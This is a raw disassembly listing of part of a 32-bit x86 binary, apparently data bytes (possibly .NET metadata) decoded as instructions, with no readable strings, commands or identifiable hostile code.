  405cd8:	65 02 0a             	add    %gs:(%edx),%cl
  405cdb:	00 ba 06 43 15 06    	add    %bh,0x6154306(%edx)
  405ce1:	00 36                	add    %dh,(%esi)
  405ce3:	12 65 02             	adc    0x2(%ebp),%ah
  405ce6:	0a 00                	or     (%eax),%al
  405ce8:	d8 06                	fadds  (%esi)
  405cea:	43                   	inc    %ebx
  405ceb:	15 06 00 68 1d       	adc    $0x1d680006,%eax
  405cf0:	55                   	push   %ebp
  405cf1:	00 16                	add    %dl,(%esi)
  405cf3:	00 05 17 e5 02 06    	add    %al,0x602e517
  405cf9:	00 37                	add    %dh,(%edi)
  405cfb:	0e                   	push   %cs
  405cfc:	55                   	push   %ebp
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 75 06             	add    %dh,0x6(%ebp)
  405d02:	65 02 06             	add    %gs:(%esi),%al
  405d05:	00 76 0f             	add    %dh,0xf(%esi)
  405d08:	65 02 06             	add    %gs:(%esi),%al
  405d0b:	00 0b                	add    %cl,(%ebx)
  405d0d:	05 65 02 06 00       	add    $0x60265,%eax
  405d12:	7d 14                	jge    0x405d28
  405d14:	65 02 06             	add    %gs:(%esi),%al
  405d17:	00 2c 12             	add    %ch,(%edx,%edx,1)
  405d1a:	65 02 16             	add    %gs:(%esi),%dl
  405d1d:	00 45 12             	add    %al,0x12(%ebp)
  405d20:	64 15 1a 00 fc 13    	fs adc $0x13fc001a,%eax
  405d26:	85 1a                	test   %ebx,(%edx)
  405d28:	1a 00                	sbb    (%eax),%al
  405d2a:	81 11 85 1a 8b 01    	adcl   $0x18b1a85,(%ecx)
  405d30:	b5 14                	mov    $0x14,%ch
  405d32:	00 00                	add    %al,(%eax)
  405d34:	1a 00                	sbb    (%eax),%al
  405d36:	21 19                	and    %ebx,(%ecx)
  405d38:	85 1a                	test   %ebx,(%edx)
  405d3a:	06                   	push   %es
  405d3b:	00 3c 15 f4 0f 06 00 	add    %bh,0x60ff4(,%edx,1)
  405d42:	7a 00                	jp     0x405d44
  405d44:	f4                   	hlt
  405d45:	0f 06                	clts
  405d47:	00 eb                	add    %ch,%bl
  405d49:	0f f4 0f             	pmuludq (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 f4                	add    %dh,%ah
  405d51:	0f 06                	clts
  405d53:	00 e4                	add    %ah,%ah
  405d55:	12 fe                	adc    %dh,%bh
  405d57:	1c 06                	sbb    $0x6,%al
  405d59:	00 33                	add    %dh,(%ebx)
  405d5b:	10 fe                	adc    %bh,%dh
  405d5d:	1c 06                	sbb    $0x6,%al
  405d5f:	00 b0 07 f4 0f 06    	add    %dh,0x60ff407(%eax)
  405d65:	00 86 10 f4 0f 1e    	add    %al,0x1e0ff410(%esi)
  405d6b:	00 2a                	add    %ch,(%edx)
  405d6d:	11 ac 17 06 00 9f 1d 	adc    %ebp,0x1d9f0006(%edi,%edx,1)
  405d74:	be 0e 06 00 d8       	mov    $0xd800060e,%esi
  405d79:	0e                   	push   %cs
  405d7a:	be 0e 06 00 83       	mov    $0x8300060e,%esi
  405d7f:	06                   	push   %es
  405d80:	be 0e 06 00 78       	mov    $0x7800060e,%esi
  405d85:	03 f4                	add    %esp,%esi
  405d87:	0f 06                	clts
  405d89:	00 23                	add    %ah,(%ebx)
  405d8b:	06                   	push   %es
  405d8c:	9e                   	sahf
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 15 14 55 00 0a    	add    %dl,0xa005514
  405d95:	00 99 18 55 00 06    	add    %bl,0x6005518(%ecx)
  405d9b:	00 d9                	add    %bl,%cl
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	f2 14 00             	repnz adc $0x0,%al
  405da5:	00 12                	add    %dl,(%edx)
  405da7:	00 a6 05 c0 12 06    	add    %ah,0x612c005(%esi)
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 ca                	add    %cl,%dl
  405db1:	02 06                	add    (%esi),%al
  405db3:	00 b8 10 f4 0f 06    	add    %bh,0x60ff410(%eax)
  405db9:	00 1b                	add    %bl,(%ebx)
  405dbb:	1d 55 11 06 00       	sbb    $0x61155,%eax
  405dc0:	3c 08                	cmp    $0x8,%al
  405dc2:	f4                   	hlt
  405dc3:	0f 06                	clts
  405dc5:	00 fd                	add    %bh,%ch
  405dc7:	14 f4                	adc    $0xf4,%al
  405dc9:	0f 06                	clts
  405dcb:	00 ff                	add    %bh,%bh
  405dcd:	05 f4 0f 22 00       	add    $0x220ff4,%eax
  405dd2:	52                   	push   %edx
  405dd3:	12 5b 13             	adc    0x13(%ebx),%bl
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	d3 16                	rcll   %cl,(%esi)
  405dda:	5b                   	pop    %ebx
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 82 13 5b 13 12    	add    %al,0x12135b13(%edx)
  405de3:	00 7a 13             	add    %bh,0x13(%edx)
  405de6:	a1 15 22 00 eb       	mov    0xeb002215,%eax
  405deb:	16                   	push   %ss
  405dec:	5b                   	pop    %ebx
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 5b 16             	add    %bl,0x16(%ebx)
  405df2:	fe                   	(bad)
  405df3:	1c 06                	sbb    $0x6,%al
  405df5:	00 f1                	add    %dh,%cl
  405df7:	11 f4                	adc    %esi,%esp
  405df9:	0f 06                	clts
  405dfb:	00 62 16             	add    %ah,0x16(%edx)
  405dfe:	fe                   	(bad)
  405dff:	1c 12                	sbb    $0x12,%al
  405e01:	00 16                	add    %dl,(%esi)
  405e03:	13 fe                	adc    %esi,%edi
  405e05:	1c 06                	sbb    $0x6,%al
  405e07:	00 aa 0f fe 1c 06    	add    %ch,0x61cfe0f(%edx)
  405e0d:	00 fb                	add    %bh,%bl
  405e0f:	00 fe                	add    %bh,%dh
  405e11:	1c 06                	sbb    $0x6,%al
  405e13:	00 db                	add    %bl,%bl
  405e15:	11 f4                	adc    %esi,%esp
  405e17:	0f 06                	clts
  405e19:	00 0c 10             	add    %cl,(%eax,%edx,1)
  405e1c:	fe                   	(bad)
  405e1d:	1c 06                	sbb    $0x6,%al
  405e1f:	00 50 05             	add    %dl,0x5(%eax)
  405e22:	fe                   	(bad)
  405e23:	1c 06                	sbb    $0x6,%al
  405e25:	00 14 05 fe 1c 06 00 	add    %dl,0x61cfe(,%eax,1)
  405e2c:	4d                   	dec    %ebp
  405e2d:	10 fe                	adc    %bh,%dh
  405e2f:	1c 06                	sbb    $0x6,%al
  405e31:	00 2f                	add    %ch,(%edi)
  405e33:	05 fe 1c 06 00       	add    $0x61cfe,%eax
  405e38:	c4 11                	les    (%ecx),%edx
  405e3a:	fe                   	(bad)
  405e3b:	1c 06                	sbb    $0x6,%al
  405e3d:	00 a3 13 f4 0f 06    	add    %ah,0x60ff413(%ebx)
  405e43:	00 91 1c f4 0f 06    	add    %dl,0x60ff41c(%ecx)
  405e49:	00 05 18 a1 15 06    	add    %al,0x615a118
  405e4f:	00 dc                	add    %bl,%ah
  405e51:	05 f4 0f 06 00       	add    $0x60ff4,%eax
  405e56:	2f                   	das
  405e57:	03 fe                	add    %esi,%edi
  405e59:	1c 06                	sbb    $0x6,%al
  405e5b:	00 c7                	add    %al,%bh
  405e5d:	00 f4                	add    %dh,%ah
  405e5f:	0f 06                	clts
  405e61:	00 ca                	add    %cl,%dl
  405e63:	05 f4 0f 06 00       	add    $0x60ff4,%eax
  405e68:	48                   	dec    %eax
  405e69:	06                   	push   %es
  405e6a:	f4                   	hlt
  405e6b:	0f 06                	clts
  405e6d:	00 34 18             	add    %dh,(%eax,%ebx,1)
  405e70:	65 02 06             	add    %gs:(%esi),%al
  405e73:	00 41 08             	add    %al,0x8(%ecx)
  405e76:	65 02 0a             	add    %gs:(%edx),%cl
  405e79:	00 b7 0f 14 11 0a    	add    %dh,0xa11140f(%edi)
  405e7f:	00 40 05             	add    %al,0x5(%eax)
  405e82:	14 11                	adc    $0x11,%al
  405e84:	00 00                	add    %al,(%eax)
  405e86:	00 00                	add    %al,(%eax)
  405e88:	49                   	dec    %ecx
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 cf                	add    %cl,%bh
  405e97:	0f 7e 1a             	movd   %mm3,(%edx)
  405e9a:	05 00 01 00 01       	add    $0x1000100,%eax
  405e9f:	00 81 01 10 00 17    	add    %al,0x17001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	7e 1a                	jle    0x405ec2
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 9f    	add    %al,-0x60ffefff(%ecx)
  405eb3:	19 9c 11 05 00 13 00 	sbb    %ebx,0x130005(%ecx,%edx,1)
  405eba:	06                   	push   %es
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 b2 12 0c 0f 05    	add    %dh,0x50f0c12(%edx)
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	37                   	aaa
  405ecf:	17                   	pop    %ss
  405ed0:	3b 14 05 00 1e 00 26 	cmp    0x26001e00(,%eax,1),%edx
  405ed7:	00 81 01 10 00 8e    	add    %al,-0x71ffefff(%ecx)
  405edd:	10 3b                	adc    %bh,(%ebx)
  405edf:	14 05                	adc    $0x5,%al
  405ee1:	00 1e                	add    %bl,(%esi)
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 4b 13             	add    %cl,0x13(%ebx)
  405eec:	3b 14 05 00 1e 00 2f 	cmp    0x2f001e00(,%eax,1),%edx
  405ef3:	00 81 01 10 00 5c    	add    %al,0x5c001001(%ecx)
  405ef9:	15 3b 14 05 00       	adc    $0x5143b,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 5b    	add    %al,0x5b001001(%ecx)
  405f07:	0f 3b                	(bad)
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 56    	add    %al,0x56001001(%ecx)
  405f15:	15 3b 14 05 00       	adc    $0x5143b,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 0a                	add    %cl,(%edx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 9c    	add    %al,-0x63ffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	3b 14 05 00 23 00 3e 	cmp    0x3e002300(,%eax,1),%edx
  405f39:	00 81 01 10 00 65    	add    %al,0x65001001(%ecx)
  405f3f:	1d 3b 14 05 00       	sbb    $0x5143b,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 98    	add    %al,-0x67ffefff(%ecx)
  405f4d:	19 7a 19             	sbb    %edi,0x19(%edx)
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 fb 0f 05    	add    %cl,0x50ffb01
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	fb                   	sti
  405f79:	0f 05                	syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 61 01             	add    %ah,0x1(%ecx)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 38                	add    %bh,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 a1 17 c5 0d 05    	add    %ah,0x50dc517(%ecx)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 5e 10             	add    %bl,0x10(%esi)
  405fb0:	c5 0d 05 00 2f 00    	lds    0x2f0005,%ecx
  405fb6:	5f                   	pop    %edi
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 6b 1c             	add    %ch,0x1c(%ebx)
  405fbe:	c5 0d 05 00 31 00    	lds    0x310005,%ecx
  405fc4:	63 00                	arpl   %eax,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	e0 0d                	loopne 0x405fd9
  405fcc:	c5 0d 05 00 33 00    	lds    0x330005,%ecx
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	15 08 c5 0d 39       	adc    $0x390dc508,%eax
  405fdd:	00 3a                	add    %bh,(%edx)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 8c 17 c5 0d 05 00 	add    %cl,0x50dc5(%edi,%edx,1)
  405fec:	47                   	inc    %edi
  405fed:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405ff3:	00 96 17 c5 0d 05    	add    %dl,0x50dc517(%esi)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 8c    	add    %al,-0x73ffefff(%ecx)
  406003:	12 c5                	adc    %ch,%al
  406005:	0d 05 00 47 00       	or     $0x470005,%eax
  40600a:	a2 00 00 01 00       	mov    %al,0x10000
  40600f:	00 52 01             	add    %dl,0x1(%edx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 1b                	add    %bl,(%ebx)
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 a6 18 	add    %ah,0x18a60016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 b3 18 12 00 16    	add    %dh,0x16001218(%ebx)
  406035:	00 0c 11             	add    %cl,(%ecx,%edx,1)
  406038:	12 00                	adc    (%eax),%al
  40603a:	16                   	push   %ss
  40603b:	00 13                	add    %dl,(%ebx)
  40603d:	0f 12 00             	movlps (%eax),%xmm0
  406040:	16                   	push   %ss
  406041:	00 3d 13 12 00 16    	add    %bh,0x16001213
  406047:	00 4f 06             	add    %cl,0x6(%edi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 f5                	add    %dh,%ch
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 a0 02 12 00 16    	add    %ah,0x16001202(%eax)
  406059:	00 a4 08 12 00 16 00 	add    %ah,0x160012(%eax,%ecx,1)
  406060:	57                   	push   %edi
  406061:	08 12                	or     %dl,(%edx)
  406063:	00 16                	add    %dl,(%esi)
  406065:	00 9e 08 15 00 16    	add    %bl,0x16001508(%esi)
  40606b:	00 a9 0d 12 00 16    	add    %ch,0x1600120d(%ecx)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 d4                	add    %dl,%ah
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 74 02 12          	add    %dh,0x12(%edx,%eax,1)
  406081:	00 16                	add    %dl,(%esi)
  406083:	00 7d 03             	add    %bh,0x3(%ebp)
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 4a 1c             	add    %cl,0x1c(%edx)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 ac 12 12 00 11 00 	add    %ch,0x110012(%edx,%edx,1)
  406096:	89 04 21             	mov    %eax,(%ecx,%eiz,1)
  406099:	00 11                	add    %dl,(%ecx)
  40609b:	00 6e 04             	add    %ch,0x4(%esi)
  40609e:	25 00 11 00 3e       	and    $0x3e001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 d4                	add    %dl,%ah
  4060a9:	03 2d 00 11 00 56    	add    0x56001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b9 03 30 00 11    	add    %bh,0x11003003(%ecx)
  4060b9:	00 9c 03 34 00 31 00 	add    %bl,0x310034(%ebx,%eax,1)
  4060c0:	82 03 37             	addb   $0x37,(%ebx)
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 f0                	add    %dh,%al
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 24 04             	add    %ah,(%esp,%eax,1)
  4060ce:	3a 00                	cmp    (%eax),%al
  4060d0:	11 00                	adc    %eax,(%eax)
  4060d2:	06                   	push   %es
  4060d3:	04 34                	add    $0x34,%al
  4060d5:	00 16                	add    %dl,(%esi)
  4060d7:	00 90 12 dc 00 06    	add    %dl,0x600dc12(%eax)
  4060dd:	06                   	push   %es
  4060de:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	79 02                	jns    0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 d7 01             	adc    $0x1,%bh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 c4 01             	add    $0x1,%ah
  4060f2:	09 01                	or     %eax,(%ecx)
  4060f4:	31 00                	xor    %eax,(%eax)
  4060f6:	07                   	pop    %es
  4060f7:	02 12                	add    (%edx),%dl
  4060f9:	00 16                	add    %dl,(%esi)
  4060fb:	00 55 17             	add    %dl,0x17(%ebp)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 9b 0d 3a 00 51 80 	sbbb   $0x80,0x51003a0d(%ebx)
  40610e:	97                   	xchg   %eax,%edi
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	8e 0d 3a 00 51 80    	mov    0x8051003a,%cs
  40611a:	72 0d                	jb     0x406129
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	f9                   	stc
  406121:	1c 29                	sbb    $0x29,%al
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 da                	add    %bl,%dl
  406127:	1c 29                	sbb    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 fa                	add    %bh,%dl
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 80 01 8b 01 11    	add    %eax,0x11018b01(%eax)
  406137:	00 66 05             	add    %ah,0x5(%esi)
  40613a:	8f 01                	pop    (%ecx)
  40613c:	01 00                	add    %eax,(%eax)
  40613e:	9a 10 30 01 01 00 bb 	lcall  $0xbb00,$0x1013010
  406145:	11 3a                	adc    %edi,(%edx)
  406147:	00 01                	add    %al,(%ecx)
  406149:	00 9a 10 30 01 01    	add    %bl,0x1013010(%edx)
  40614f:	00 35 14 c7 01 01    	add    %dh,0x101c714
  406155:	00 ab 07 12 00 01    	add    %ch,0x1001207(%ebx)
  40615b:	00 8b 07 12 00 01    	add    %cl,0x1001207(%ebx)
  406161:	00 ad 0a 37 00 01    	add    %ch,0x100370a(%ebp)
  406167:	00 0b                	add    %cl,(%ebx)
  406169:	08 02                	or     %al,(%edx)
  40616b:	02 01                	add    (%ecx),%al
  40616d:	00 a3 1a c7 01 01    	add    %ah,0x101c71a(%ebx)
  406173:	00 9a 10 30 01 01    	add    %bl,0x1013010(%edx)
  406179:	00 8c 1c 06 02 06 06 	add    %cl,0x6060206(%esp,%ebx,1)
  406180:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	03 12                	add    (%edx),%edx
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 56 0f 02          	adcb   $0x2,0xf(%esi)
  40618f:	02 56 80             	add    -0x80(%esi),%dl
  406192:	7b 12                	jnp    0x4061a6
  406194:	02 02                	add    (%edx),%al
  406196:	56                   	push   %esi
  406197:	80 91 1c 02 02 56 80 	adcb   $0x80,0x5602021c(%ecx)
  40619e:	c9                   	leave
  40619f:	0c 02                	or     $0x2,%al
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	e5 13                	in     $0x13,%eax
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 86 10 02 02 56 80 	addb   $0x80,0x56020210(%esi)
  4061b6:	10 19                	adc    %bl,(%ecx)
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 48 06 02          	orb    $0x2,0x6(%eax)
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	b0 07                	mov    $0x7,%al
  4061c4:	02 02                	add    (%edx),%al
  4061c6:	56                   	push   %esi
  4061c7:	80 4a 1d 02          	orb    $0x2,0x1d(%edx)
  4061cb:	02 33                	add    (%ebx),%dh
  4061cd:	01 1a                	add    %ebx,(%edx)
  4061cf:	02 fd                	add    %ch,%bh
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 a3 10 0a 00 01    	add    %ah,0x1000a10(%ebx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	07                   	pop    %es
  4061e9:	15 0e 00 01 00       	adc    $0x1000e,%eax
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 0d 17 1d 00 01    	add    %cl,0x1001d17
  4061fb:	00 50 28             	add    %dl,0x28(%eax)
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	91                   	xchg   %eax,%ecx
  406203:	00 3d 0d 1d 00 01    	add    %bh,0x1001d0d
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 54 1a 3d    	add    %dl,0x3d1a5408(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 62 1a 42    	add    %dl,0x421a6208(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 38 1a 48    	add    %dl,0x481a3808(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 46 1a 4d    	add    %dl,0x4d1a4608(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 94 13 53    	add    %dl,0x53139408(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 9f 13 58    	add    %dl,0x58139f08(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 1c 0b 5e    	add    %dl,0x5e0b1c08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 2b                	or     %ch,(%ebx)
  406283:	0b 62 00             	or     0x0(%edx),%esp
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 d1 19 5e    	add    %dl,0x5e19d108(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 dc 19 62    	add    %dl,0x6219dc08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 d0 0a 67    	add    %dl,0x670ad008(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 de 0a 6c    	add    %dl,0x6c0ade08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 4b 03 1d    	add    %dl,0x1d034b08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 5b 03 72    	add    %dl,0x72035b08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 fb 02 77    	add    %dl,0x7702fb08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 8c 0b 67    	add    %dl,0x670b8c08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 95 0b 6c    	add    %dl,0x6c0b9508(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 f2 0e 7b    	add    %dl,0x7b0ef208(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 ff 0e 7f    	add    %dl,0x7f0eff08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e9 0c 1d    	add    %dl,0x1d0ce908(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 fa 0c 72    	add    %dl,0x720cfa08(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 27 1a 0a    	add    %dl,0xa1a2700(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 6c 07 84    	add    %dl,-0x7bf89400(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
